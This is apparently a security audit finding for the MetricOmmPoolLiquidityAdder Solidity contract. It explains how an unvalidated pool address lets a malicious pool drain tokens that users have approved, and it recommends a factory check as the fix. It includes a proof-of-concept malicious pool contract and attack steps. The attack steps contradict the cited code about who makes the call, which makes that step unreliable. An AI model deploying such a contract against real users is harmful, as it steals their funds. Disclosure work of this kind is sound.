### Title
`MetricOmmPoolLiquidityAdder` Accepts Unvalidated Pool Addresses, Allowing a Malicious Pool to Drain User-Approved Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` does not verify that the caller-supplied `pool` address is a legitimate pool registered on the factory. Because the callback's pool-identity check (`msg.sender == expectedPool`) uses the same unvalidated address, a malicious pool can satisfy that check, return arbitrary token addresses from `getImmutables()`, and cause the callback to pull up to `maxAmountToken0`/`maxAmountToken1` of any token the victim has approved to the adder.

---

### Finding Description

Every `addLiquidity*` entry point stores the caller-supplied `pool` in transient storage and immediately calls into it: [1](#0-0) 

The contract's own NatSpec acknowledges the gap:

> *"This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."*

The callback enforces only two guards:

```solidity
if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
if (amount0Delta > max0 || amount1Delta > max1) revert MaxAmountExceeded(...);
``` [2](#0-1) 

Both guards are trivially satisfied by a malicious pool: `msg.sender` equals the attacker-controlled address stored as `expectedPool`, and the malicious pool can request exactly `max0`/`max1`. After the guards pass, the callback fetches token addresses from `IMetricOmmPool(msg.sender).getImmutables()` — a call the malicious pool fully controls — and executes:

```solidity
pay(token0, payer, msg.sender, amount0Delta);
pay(token1, payer, msg.sender, amount1Delta);
``` [3](#0-2) 

The malicious pool therefore chooses which tokens are pulled from the victim and receives them directly.

**Contrast with the router**: `MetricOmmSimpleRouter` validates every pool against the factory before calling it, as evidenced by the `InvalidPool` error and the test `test_exactInputSingle_revertsInvalidPool`. [4](#0-3) 

The `MetricOmmPoolLiquidityAdder` has no equivalent guard, creating an inconsistency in the periphery's security posture.

---

### Impact Explanation

A victim who has approved tokens (e.g., USDC, WETH) to `MetricOmmPoolLiquidityAdder` and is tricked into calling any `addLiquidity*` function with a malicious pool address loses up to `maxAmountToken0` of `token0` and `maxAmountToken1` of `token1` — the exact caps the victim believed were their worst-case spend. The attacker receives the tokens directly (the malicious pool is the `recipient` in `pay`). This is a direct loss of user principal.

---

### Likelihood Explanation

The attack requires:
1. The victim to have approved tokens to the adder (standard prerequisite for any liquidity add).
2. The victim to call an `addLiquidity*` function with an attacker-controlled pool address — achievable via phishing, a malicious front-end, or a compromised aggregator that constructs the calldata.

No privileged access is needed. Any EOA can deploy a malicious pool contract. The likelihood is medium: the preconditions are realistic in a DeFi context where users interact with multiple pool addresses.

---

### Recommendation

Add a factory provenance check at the top of every `addLiquidity*` entry point, mirroring the pattern already used in `MetricOmmSimpleRouter`:

```solidity
// In MetricOmmPoolLiquidityAdder constructor, store the factory address.
// At the start of addLiquidityExactShares / addLiquidityWeighted:
if (!IMetricOmmPoolFactory(factory).isPool(pool)) revert InvalidPool(pool);
```

Alternatively, validate inside `metricOmmModifyLiquidityCallback` before trusting `msg.sender` as a pool source for `getImmutables()`.

---

### Proof of Concept

```solidity
contract MaliciousPool {
    address immutable token;   // e.g. USDC victim approved to adder
    address immutable attacker;

    // Implements IMetricOmmPoolActions.addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back into the adder as if we are a legitimate pool
        IMetricOmmPoolLiquidityAdder(msg.sender)
            .metricOmmModifyLiquidityCallback(
                MAX0,   // exactly the victim's cap
                MAX1,
                abi.encode(uint8(1)) // KIND_PAY
            );
        return (MAX0, MAX1);
    }

    // Implements IMetricOmmPool.getImmutables — returns attacker-chosen tokens
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token;   // USDC
        imm.token1 = token;   // or any other approved token
    }
}

// Attack:
// 1. Victim approves 1000 USDC to MetricOmmPoolLiquidityAdder.
// 2. Attacker calls:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,          // owner (or msg.sender overload)
    0,               // salt
    deltas,
    1000e6,          // maxAmountToken0 — victim's cap
    0,               // maxAmountToken1
    ""
);
// 3. MaliciousPool.addLiquidity fires, calls metricOmmModifyLiquidityCallback(1000e6, 0, KIND_PAY).
// 4. Guards pass: msg.sender == expectedPool (maliciousPool), 1000e6 <= max0.
// 5. pay(USDC, victim, maliciousPool, 1000e6) executes — victim loses 1000 USDC.
``` [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L152-179)
```text
  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L192-207)
```text
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol (L29-31)
```text
  /// @notice Pool is not registered on the configured factory.
  /// @param pool Address that failed factory provenance validation.
  error InvalidPool(address pool);
```
